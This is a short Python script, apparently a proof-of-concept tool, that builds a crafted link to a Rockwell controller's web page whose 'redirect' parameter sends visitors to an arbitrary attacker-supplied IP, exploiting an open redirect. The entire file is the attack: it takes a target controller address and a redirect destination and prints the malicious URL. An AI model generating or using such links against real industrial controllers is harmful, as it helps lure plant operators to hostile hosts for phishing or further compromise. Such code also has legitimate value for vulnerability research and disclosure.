import argparse

parser = argparse.ArgumentParser(description='Callback Script')
parser.add_argument('-r', '--redirect', required=True, dest="redirect", action='store', help='Redirect Destination IP')		
parser.add_argument('-p', '--plc', required=True, dest="plc", action='store', help='Rockwell Controller IP')	
args = parser.parse_args()  #Parse Command Line Arguments

print("Generating link...")
print("http://"+args.plc+"/index.html?redirect=//"+args.redirect)
